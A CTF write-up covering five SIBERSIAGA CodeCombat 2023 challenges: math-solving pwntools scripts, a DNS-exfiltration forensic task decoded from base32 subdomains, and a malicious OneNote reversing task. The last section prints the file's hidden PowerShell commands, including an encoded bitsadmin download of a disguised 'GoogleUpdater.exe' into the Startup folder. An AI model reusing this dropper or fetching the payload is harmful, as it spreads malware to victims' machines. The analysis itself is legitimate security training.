---
title: "SIBERSIAGA CodeCombat 2023 Write-Up"
categories: CodeCombat2023
permalink: /ctfs/codecombat2023/codecombatctf
toc: true
toc_label: "cat codecombatctf.md"
toc_icon: "terminal"
---
5 challenges: Misc x2, Web x1, Forensic x1, Rev x1

# Math Master [MISC][QUALS]
41.67 points, 12 solves

## 📁 Challenge Description
>Test your mathematical skills in this rapid-fire math challenge! Solve 100 math problems involving minimum, mode, maximum, average, and median calculations within 3 seconds for each question. Do you have what it takes to be a Math Master?
>
>`nc math.sibersiaga2023.myctf.io 8887`
>
>Flag format: `sibersiaga{strings}`

Connect the instance.

```
nc math.sibersiaga2023.myctf.io 8887

░██████╗██╗██████╗░███████╗██████╗░  ░██████╗██╗░█████╗░░██████╗░░█████╗░
██╔════╝██║██╔══██╗██╔════╝██╔══██╗  ██╔════╝██║██╔══██╗██╔════╝░██╔══██╗
╚█████╗░██║██████╦╝█████╗░░██████╔╝  ╚█████╗░██║███████║██║░░██╗░███████║
░╚═══██╗██║██╔══██╗██╔══╝░░██╔══██╗  ░╚═══██╗██║██╔══██║██║░░╚██╗██╔══██║
██████╔╝██║██████╦╝███████╗██║░░██║  ██████╔╝██║██║░░██║╚██████╔╝██║░░██║
╚═════╝░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝  ╚═════╝░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝
Hi Cyber Troopers!
I made a math question generator and I would like you to solve every math question within 3 seconds with a total of 100. I will give you the flag when you are done.
Find: Min of [23, 45, 123, 1, 654, 700, 4]
<input>
<repeat your input>
Wrong answer.
```

## 🚩 Solution
The aim of the challenge is to test your custom script development. Basically, when you connect to the instance, it will print out the banner together with the math question one at a time after you have solved it. The challenge description indicates the syllabus of the math questions (`min`, `max`, `mod`, `average`, and `median`). The flag will be printed out when your solve count equals 100. 

To solve this kind of challenge, 3 requirements need to be met.

1. You must understand how to use `pwntools`. (It is by far the easiest tool to solve it.)
2. You must understand `Python`. :D
3. You must know how to deal with data types. (e.g., `b'3'`, `'3'`, and `3` are three different data types over here.)

Here is my ~~shamless~~ `solve.py` script.

```python
#!/usr/bin/env python3
from pwn import *

def math_func(ques):
	li = [] # Always clear the list every time the function gets called.

	if "Min from " in ques:
		element = ques[10:-1]
		elements = list(element.split(', '))
		for num in elements:
			li.append(int(num))
		li.sort()
		return li[0] # Return first element.
			
	if "Max from " in ques:
		element = ques[10:-1]
		elements = list(element.split(', '))
		for num in elements:
			li.append(int(num))
		li.sort()
		return li[-1] # Return last element

	if "Median of " in ques:
		element = ques[11:-1]
		elements = list(element.split(', '))
		for num in elements:
			li.append(int(num))
		li.sort()
		if len(li) % 2 != 0:
			ans = li[len(li)//2]
		else:
			ans = (li[len(li)//2 - 1] + li[len(li)//2]) / 2 # Median calculation.
		return ans

	if "Average of " in ques:
		element = ques[12:-1]
		elements = list(element.split(', '))
		total = 0
		for num in elements:
			total += int(num)
		return total/len(elements) # Average calculation.

	if "mod" in ques:
		element = ques[1:-1]
		elements = list(element.split(' mod '))
		ans = int(elements[0]) % int(elements[1]) # Modulus calculation.
		return ans

s = remote('math.sibersiaga2023.myctf.io', 8887)
count = 0

while count != 100:
	s.recvuntil(b':')
	ques = s.recvline().decode().strip().replace('\r\n', '') # Math question.

	ans = math_func(ques)
	s.sendline(str(ans).encode())
	s.recvline() # Repeat the line we sent.
	s.recvline() # b'Correct! Next Question.'
	count += 1

print(s.recvline().decode().strip())
print(s.recvline().decode().strip())
s.close()
```
Output:
```
[x] Opening connection to math.sibersiaga2023.myctf.io on port 8887
[x] Opening connection to math.sibersiaga2023.myctf.io on port 8887: Trying 128.199.224.232
[+] Opening connection to math.sibersiaga2023.myctf.io on port 8887: Done
Congratulations! You are fast enough!
The flag is sibersiaga{7h1nk_f4573r_cyb3r_7hr00p3r5}
[*] Closed connection to math.sibersiaga2023.myctf.io port 8887
```

***FLAG***: `sibersiaga{7h1nk_f4573r_cyb3r_7hr00p3r5}`

# Cryptic Equation Conundrum [MISC][FINALS]
500 points, 1 solve (1st 🩸 & only 🩸)

## 📁 Challenge Description
>You've stumbled upon a mysterious program that claims to test your mathematical skills. The program generates a series of complex mathematical equations and challenges you to solve them within a tight time limit. Are you up for the challenge?
>
>`nc cryptic.sibersiaga2023.myctf.io 9999`
>
>Flag format: `sibersiaga{flag}`

Connect the instance.

```
nc cryptic.sibersiaga2023.myctf.io 9999

░██████╗██╗██████╗░███████╗██████╗░  ░██████╗██╗░█████╗░░██████╗░░█████╗░
██╔════╝██║██╔══██╗██╔════╝██╔══██╗  ██╔════╝██║██╔══██╗██╔════╝░██╔══██╗
╚█████╗░██║██████╦╝█████╗░░██████╔╝  ╚█████╗░██║███████║██║░░██╗░███████║
░╚═══██╗██║██╔══██╗██╔══╝░░██╔══██╗  ░╚═══██╗██║██╔══██║██║░░╚██╗██╔══██║
██████╔╝██║██████╦╝███████╗██║░░██║  ██████╔╝██║██║░░██║╚██████╔╝██║░░██║
╚═════╝░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝  ╚═════╝░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝
Welcome Cyber Troopers!
See whether you are worthy enough to have the flag by solving every math question within 5 seconds with a total of 1000.
Decrypt and solve this question: Hkpf **;229 , 452:+ - 597:+
<input>
<repeat your input>
Wrong answer.
Result: 20791914
```

## 🚩 Solution

This challenge took me 4 hours to solve it. This is the upgraded version since `Math Master` in the qualifying round. The concept is the same, however, it requires additional things such as trigonometry calculation, encryption, and decryption, and the solve count needs to be reached until 1000 instead of 100 in order to retrieve the flag.

By manually playing around with the encrypted math challenges, we concluded with two major encryption schemas.

1. **Base64 + XOR**: This can be identified via the `Magic` function in [CyberChef](https://gchq.github.io/CyberChef/).

   ![image](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/210f0fa1-52d3-4042-a98f-9f1fac2e1570)

   - Before Base64 + XOR.

     ```
     b'SGdgai4mJj05OT4uIy46Nzg/Jy4lLiY2Oz06LiMuNzo+Nicn'
     b'YE9IQgYODhIeExcGCQYQEBEXDwYNBg4fERQUBgsGFRYVEg8P'
     b'Un16cDQgJjQ+NCY0PzQgJjQ7NCY='
     ```
   
   - After Base64 + XOR.

     ```
     Find ((3770 - 4961) + (8534 - 9408))
     Find ((4851 / 6671) + (9722 - 3034))
     Find 42 * 2 + 42 / 2
     ```

1. **ASCII Shift Cipher**: This can be identified via the `ROT` Cipher function in [dCode](https://www.dcode.fr/rot-cipher).

   ![image](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/ce55428c-ec37-40e2-9924-b5b2f92cd49b)

   - Before ASCII Shift Cipher.

     ```
     Hkpf **;229 , 452:+ - 597:+
     Psxn ~kx2;A3
     Qtyo 33?=;D 5 ==D;4 5 =B=;4
     ```
  
   - After ASCII Shift Cipher.

     ```
     Find ((9007 * 2308) + 3758)
     Find tan(17)
     Find ((4209 * 2290) * 2720)
     ```

After completing the decryption part, there are 2 types of math questions were revealed.

1. **Normal Arithmetic**
   
   ```
   Find 96 * 2 + 96 * 4
   Find 8354 / 2 - 763
   Find (7356 - 657) * 34
   ```
2. **Trigonometry**
   
   ```
   Find cos(5)
   Find sin(67)
   Find tan(54)
   ```

Take note that the value of each trigonometry question was calculated using **radians** instead of **degrees**. This can be concluded from connecting the instance as it will return the correct answer when your answer given is incorrect.

Moreover, I encountered that trigonometry questions generated from ASCII Shift Cipher sometimes return inconsistent results, causing errors during calculation.

```
Find co<0x61>(38)
Find <0x38>in(66)
Find <0x45>an(79)
```

I almost ended up giving up solving this challenge until my legendary teammate suggested I look for patterns of trigonometry questions. Luckily, this method is feasible as the result always stays inconsistent on the same letter of each trigonometry function.

Hence, my script ended up finding `in` for the sine function, `co` for the cosine function, and `an` for the tangent function. Normal arithmetic should be easily calculated using `eval()`.

Here is my ~~other shamless~~ `solve.py` script.

```python
#!/usr/bin/env python3
from pwn import *
from math import *
from base64 import b64decode
import string

def apply_ascii_shift(text, shift):
    result = ""
    for char in text:
        if char.isprintable() and char != ' ':
            ascii_offset = ord('!')
            shifted = (ord(char) - ascii_offset + shift) % 95 + ascii_offset
            result += chr(shifted)
        else:
            result += char
    return result

def ascii_func(x):
	for shift in range(95):  # There are 95 printable ASCII characters
		decoded_text = apply_ascii_shift(x, shift)
		if "Find" in decoded_text:
			return str(decoded_text)
			break

def base64_xor_func(x):
	x = x[2:-1]
	decode = b64decode(x)
	for i in range(127):
		a = hex(i)
		xor = ''.join(chr(b ^ int(a[2:], 16)) for b in decode)
		if "Find" in xor:
			return xor
			break

def calc(x):
	f = str(x)[5:]
	if "in" in f: # Sine function
		angle_in_degrees = f[4:-1]
		angle_in_radians = math.radians(int(angle_in_degrees))
		sin_value = math.sin(angle_in_radians)
		result = round(sin_value, 2) # Round to 2 decimal points
		return result

	if "co" in f: # Cosine function
		angle_in_degrees = f[4:-1]
		angle_in_radians = math.radians(int(angle_in_degrees))
		cos_value = math.cos(angle_in_radians)
		result = round(cos_value, 2) # Round to 2 decimal points
		return result

	if "an" in f: # Tangent function
		angle_in_degrees = f[4:-1]
		angle_in_radians = math.radians(int(angle_in_degrees))
		tan_value = math.tan(angle_in_radians)
		result = round(tan_value, 2) # Round to 2 decimal points
		return result

	else: # Normal Arithmetic
		result = eval(f)
		if "/" not in str(result):
			result = int(result)
		return result
	
s = remote('cryptic.sibersiaga2023.myctf.io', 9999)
count = 0
s.recvuntil(b'.\r\n').decode().strip()

while count != 1000:
	test = s.recvline().decode().strip()[19:-2]

	if "b'" in test:
		ans = base64_xor_func(test)
		ans = calc(ans)
	else:
		ans = ascii_func(test)
		ans = calc(ans)

	s.sendline(str(ans).encode())
	s.recvline()
	s.recvline()
	count += 1

print(s.recvline().decode().strip())
print(s.recvline().decode().strip())
s.close()
```
Output:
```
[x] Opening connection to cryptic.sibersiaga2023.myctf.io on port 9999
[x] Opening connection to cryptic.sibersiaga2023.myctf.io on port 9999: Trying 128.199.224.232
[+] Opening connection to cryptic.sibersiaga2023.myctf.io on port 9999: Done
Congratulations! You are worthy!
The flag is sibersiaga{cyb3r_7hr00p3r5_y0u_4r3_w0rthy_3n0ugh}
[*] Closed connection to cryptic.sibersiaga2023.myctf.io port 9999
```

***FLAG***: `sibersiaga{cyb3r_7hr00p3r5_y0u_4r3_w0rthy_3n0ugh}`

# Cloud Storage V2 [WEB][FINALS]
55.56 points, 9 solves

## 📁 Challenge Description
>I've upgraded the upload system to a new one. You may no longer exploit it now!
>
>`http://cloudstorage.sibersiaga2023.myctf.io/`
>
>flag is in `/home/flag.txt`
>
>Flag format: `sibersiaga{md5hash}`

## 🚩 Solution
Explanation in progress.

***FLAG***: `sibersiaga{9c44f131b9d72f89d9a1c8520c42468d}`

# Night Shift Ends Soon [FORENSIC][QUALS]
125 points, 4 solves (1st 🩸)

## 📁 Challenge Description
>Ahmad was on his night shift when he remotely via the monitoring console, observed an unusual network activity from a user's segment of one of the branch offices. It is strange to see someone still in the branch office at this time. After consulting his other team member on duty, Ahmad decided to run a packet capture, capturing packets from the machine. He did some analysis on the captured packet, but he couldn't find anything suspicious - maybe someone was actually still in office during that time. His shift is ending soon. He needs to get someone from the next shift to help with this. And that someone is you.
>
>Please access this artifact: `https://drive.google.com/file/d/1M0iVNeEGCxRzTEIkN03EwLE7NBidVcw/view`
>
>Password: `sibersiaga2023`
>
>Flag format: `sibersiaga{flag}`

## 🚩 Solution
When we have been given a `.pcapng` file, it would always be good to look into the protocol hierarchy to investigate which protocol we are most likely will be dealing with.

![image](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/0864d46f-97b1-4541-b6d3-e84125427ce4)

The most possible protocol will be dealing with `DNS` packets (3.7% Packets) as there are approximately 0.2% `HTTP` packets captured and packets such as `QUIC` and `TLS` (without any extra information given) are not worth deep diving in as they are encrypted packets.

![image](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/c0d157cd-911f-48bd-8629-5f081b0da011)

Roughly looking at it, there are quite a lot of DNS packets going on in Wireshark. Hence, we can utilize `tshark` to grab every hostname from all DNS packets in the given `.pcapng` file and save it into a new file `dns.txt`.

`tshark` is yet another alternative packet analysis tool but in command line interface (CLI). The advantage given is that it can be used together with other advanced tools such as `tr`, `awk`, `sed`, `cut`, `grep`, etc. during packet filtering.  

```
$ tshark -r pcap01.pcapng -f fields -e dns.qry.name | sed '/^$/d' | uniq > dns.txt
```

Looking into the `dns.txt` file, there are some hostnames encoded with a random format which possibly lead to a potential foothold. By playing around with those hostnames, there is one domain utterly interesting and catches my eye which is `a.thectf.site`.

```
┌──(kali㉿kali)-[~/codecombat2023]
└─$ cat dns.txt | grep 'a.thectf.site' | uniq
01-RFIE4RYNBINAUAAAAAGUSSCEKIAAAAMQAAAAAFQIAYAAAAHOEH.a.thectf.site
02-FL2AAAAAEXASCZOMAAAFRFAAABMJIBJFJCJ4AAAACW6SKEIFKH.a.thectf.site
03-RWXNLTWZDIZQBSSQLN2ABO2EAC3JQELGRAIWNCARM2EBCZUCCL.a.thectf.site
04-PE6ZXOARVDSOWSP4HOM33J4ZW6T5OUP2GL7IYE5GWX5PKRABCB.a.thectf.site
05-CBCBINACIEIAJQICIIIAIQNQQAIAIQIQFQQAIQIQYR7VCQECSQ.a.thectf.site
06-7PB62DWP5PW4H4HXGPACZIE7ZXOUXXQHTSCV376HZZXMHZORBY.a.thectf.site
07-4GT4JDXRKW7P4TJ3X4SEOLFTXR7TPIRUO7VFL2VZKL3LCUIMJU.a.thectf.site
08-JET6LA73CHMBUOURLRPEPHNVNUD6HD5V57RR22HYETBM5IJD7W.a.thectf.site
09-V7TPGEGPSBMA26PGBLCRZUKLV4MQWG2TN3WEL7FPZXUNKXOQBO.a.thectf.site
10-I3SFVBWGA7UYRIZBOCWVTL4WLBV4I4LXZRKONSQYGVC7ZVEI3D.a.thectf.site
11-UFUQ66SC3M3RLO22SR3DJLUY2RFWVCCJ3DTHRTFDOQ4QR7SPOP.a.thectf.site
12-BQQP5I2RWSTIHP4VYLBCRNOQYVRUQ3HYJ2KE2FFQIXFVINAST2.a.thectf.site
13-EEZNOIWUU6UC6ST6V4K2XNLSJPWXRDWG7RT6LSC2GZCPZJOXH2.a.thectf.site
14-IAFEQOQFSJP5JUVLXO45CQQPMJBZ523UIFA53DVPNKJK7K6YLK.a.thectf.site
15-HE5MEWZ2ZNVZZZMRV634ZY4U43SBHZJK5OLAINUY7J7KRS5UYQ.a.thectf.site
16-BNJYAOSTR4YJTREQPLNWTM4SN4EUPBCG7G6RFEN4NSHLW53MIZ.a.thectf.site
17-LJABBPJ4TFZ7WQR736ZU6NBWHSMUW7VPDGVV4TSAOJF626HW2Y.a.thectf.site
18-QLCOVLXSYRUBOE2MO5LS4TA7YZPDX5AEUSBJYCTWUHQWZB4F5M.a.thectf.site
19-S3YTILVFC2CUTOTT3VXPVIF6YRMQZDHK2U2GX4VXGOX6H2VOPD.a.thectf.site
20-SGI45SQPPXECPYQDJ34XSPLRSI3OFCHM7WAIPVSEEQEQ42TQUK.a.thectf.site
21-E2W2QDKLPJMR3XDA5ASM7FLTDX3KXMBGLJAHEMSPJLLU4NB7NX.a.thectf.site
22-ID5EOYFDE6Z6N5K2WCEOIBZEWTLY6ZLOB7QYR65TISWHK6IHOR.a.thectf.site
23-DPIQPFIH6XJOEBUKOFKJP25NHM6GYHHFBVQL7RNDEI6HJONVDJ.a.thectf.site
24-JHKVACFR2UMMQTDNWKI2RTD2OIULTHL2VN5B5FNQ26BCPVKFDG.a.thectf.site
25-ERET4C2JH7NKTF4O7JFHVSLVXNQT7GMQKJTMHHM3WID47QZ5XV.a.thectf.site
26-ZDFJYM34PJRABM7OQLDYOJ5T432VVMEI4QDSJNGXRTSGXT3ILS.a.thectf.site
27-TM6HE5KUBUD4DDYWSLRWKB7UTWP6C3WCWR2YYPCQEYRZMNV7EL.a.thectf.site
28-ZFL6CQFUQWZYTWXSG4VIRTHK6T3SGUAGCUAFA7RSHDXHO6TGDX.a.thectf.site
29-WFHI7GP2FTZ6YVRH44WHXP6AM44J5H6UM3VDFTZZAM6V2SC2VA.a.thectf.site
30-GT3PNM4KITFMP2KDDQFG5TFGLYF36QISRWKRS7RIRPNCOGYZNN.a.thectf.site
31-RS4I37X4MKU2CO6NYURTT2ITLHRP7LGPWBNJA6VDXIQXXJ3TY7.a.thectf.site
32-2ZWL7NDI2UIATOGQLT4FS47VIJEQ4UOEUR52VZNTE3DKF22TMF.a.thectf.site
33-JQQAQH3EALE5TILXZYZGOYBCLJKYERHYJSM6AXQKBF3ALZFY5I.a.thectf.site
34-FUIL5ZZG3EYMPLX2YYA2EZKOB535CB5QJY3DM4ZRI36X4NKU2C.a.thectf.site
35-OIATJCWXQRWWPC7EAJUQVDXCLPNO5SOVZEOTCNEOOTJAWMI4BK.a.thectf.site
36-5KYK255AKM5JOFAJXDZACFES7GJUS3ZUNI3QB7ADQE4EJT2UQ3.a.thectf.site
37-DPWPMS3L6B5RYAO7C7HEIEJ6SESNTAU56R5MGF4IL2OQR7QEET.a.thectf.site
38-SFIOCGTWGXH6BRVALSF45ENQTTXSROMCP2QT6RULT23OYTVNEE.a.thectf.site
39-4QDSJPWXQLVNIF6LCNH7X2T5L32ACDORDPNC7ET6PL2L55AE4J.a.thectf.site
40-PEJUAH3Q3BOZDK3IPZ673ER2IWS36LZPHCTAFM62INYPPZCWMP.a.thectf.site
41-ORTZPMIYM6B5MLNMHUZRVFXYPAC2IV72RSC25ZFJT2LZZELWXT.a.thectf.site
42-AKPSMM3OS4SKQVHKNJPYP3RAGRDPMWRTH23ZFWCW5OWQP5H5TU.a.thectf.site
43-GTZP2QL5M3M47ZBIYIJ66VSEN7C6FNLL3HAQZEWTLY6Z2MO7DB.a.thectf.site
44-N6GW3DL6IX5GLO5KC6RA6KRP6CAWCBIJ7PU2IUOW7TL3PYYJ4R.a.thectf.site
45-JASF2QFA56AZBYWGRXOOVMVI6RGXIEUJIT5E56UWN6RP6ZD2GT.a.thectf.site
46-4M2IEE537BMFUJIQRH2BWFPYFYWIAIQIQPQ47OARARABALBBAR.a.thectf.site
47-ABGBAJBBABCB7QAPYAUWN2JAHLOVF72QAAAAABEUKTSEVZBGBA.a.thectf.site
48-Q=.a.thectf.site
d1bfe-48.a.thectf.site
a87de-0.a.thectf.site
```

We discovered that every subdomain of `a.thectf.site` can be decoded using **BASE 32**. The decoded string is actually `PNG` raw binaries. Hence, every subdomain had also been given an identifier stating the order in which the string should be placed. Therefore, these raw binary strings can be pieced together to reconstruct a `PNG` image.

All the reconstruction processes can be done with the power of CLI tools.

I will ~~use some algebraic representations to~~ explain the tools I will be using to get the image easily.

```
$ cat dns.txt | grep 'a.thectf.site' == cmd1 # filter hostnames that only have a.thectf.site.
$ cmd1 | uniq == cmd2                        # filter repetitive hostnames.
$ cmd2 | cut -d. -f1 | cut -d- -f2 == cmd3   # keep only the encoded subdomains and remove other information.
$ cmd3 | tr -d "\n\r" == cmd4                # remove new lines.
$ cmd4 | sed 's/.\{3\}$//' == cmd5            # remove the last 3 lines (include the last empty line).
$ cmd5 | base32 -d > flag.png == cmd6        # decode using base32 and save it to flag.png.
$ cmd6 && eog flag.png                       # view the content of flag.png.
```

Final command.

```
$ cat dns.txt | grep 'a.thectf.site' | uniq | cut -d. -f1 | cut -d- -f2 | tr -d "\n\r" | sed 's/.\{3\}$//' | base32 -d > flag.png && eog flag.png
```

![image](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/8be47323-77b2-4301-aee6-6abcf0de1a76)

Hence, this proved our path is correct and the flag is revealed.

***FLAG***: `sibersiaga{9838471a326513ca81498eb844ade8a9}`

# Note [REV][QUALS]
50 points, 10 solves

## 📁 Challenge Description
>Our company recently received a file claiming to contain flags for Sibersiaga 2023. When opening the file, all it showed was a blurred page with a "click here to view" button. So far, nothing has happened to our employees. Yet. Please investigate this one note at your earliest convenience. Disclaimer: -This contains real malware. Please proceed in a safe environment. -Do not upload files on VT or any malware sandbox to avoid fingerprint and bad labeling.
>
>Password: `infected`
>
>Flag format: `sibersiaga{strings}`

## 🚩 Solution

After unzipping the challenge file, we can start analyzing the file with `file` and `strings`. We found an encrypted PowerShell payload at the bottom context after using `strings`. Hence we can `grep` the payload out.

```
┌──(kali㉿kali)-[~/codecombat2023/note]
└─$ file One\ Note.one
One Note.one: data
                                                                                                                                                             
┌──(kali㉿kali)-[~/codecombat2023/note]
└─$ strings One\ Note.one | grep 'powershell'
start powershell -WindowStyle Hidden -Command calc.exe
for /f %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL01vcmdhblRhcmF1bS9zaWx2ZXItc3Bvb24vcmF3L21haW4vR29vZ2xlVXBkYXRlci5leGU='))"') do set "humuhumu=%%i"
powershell -WindowStyle hidden -e "JABoAHUAaAB1ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAGEASABSADAAYwBIAE0ANgBMAHkAOQBuAGEAWABSAG8AZABXAEkAdQBZADIAOQB0AEwAMAAxAHYAYwBtAGQAaABiAGwAUgBoAGMAbQBGADEAYgBTADkAegBhAFcAeAAyAFoAWABJAHQAYwAzAEIAdgBiADIANAB2AGMAbQBGADMATAAyADEAaABhAFcANAB2AFIAMgA5AHYAWgAyAHgAbABWAFgAQgBrAFkAWABSAGwATABtAFYANABaAFEAPQA9ACcAKQApAA0ACgAkAGgAdQBtAHUAaAB1AG0AdQBoAHUAPQAkAGUAbgB2ADoAYQBwAHAAZABhAHQAYQAgACsAIAAiAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABHAG8AbwBnAGwAYQBVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAYgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcgAgAG0AeQBEAG8AdwBuAGwAbwBhAGQASgBvAGIAIAAvAGQAbwB3AG4AbABvAGEAZAAgAC8AcAByAGkAbwByAGkAdAB5ACAAbgBvAHIAbQBhAGwAIAAkAGgAdQBoAHUAIAAkAGgAdQBtAHUAaAB1AG0AdQBoAHUA"
```

Surprisingly, there is another payload with a base64 encoded string `aHR0cHM6Ly9naXRodWIuY29tL01vcmdhblRhcmF1bS9zaWx2ZXItc3Bvb24vcmF3L21haW4vR29vZ2xlVXBkYXRlci5leGU` appeared after filtering out the challenge file. 

Decode the string via CyberChef and we get a link navigating to a GitHub repository.

![image](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/aee17545-de3d-4374-b623-1e63de042bf9)

Go to the following link, we can see the repository contains a `GoogleUpdater.exe`.

![image](https://github.com/pikaroot/pikaroot.github.io/assets/107750005/8c6d1dcd-5e12-4bb1-8a03-391af3d09a72)

Download the file, run `strings`, and try `grep` the flag out as we already know the flag format.

```
┌──(kali㉿kali)-[~/codecombat2023/note]
└─$ strings GoogleUpdate.exe| grep -i sibersiaga
echo sibersiaga{s4Tu_n0T4_m41w4Re} > nul
```

***FLAG***: `sibersiaga{s4Tu_n0T4_m41w4Re}`
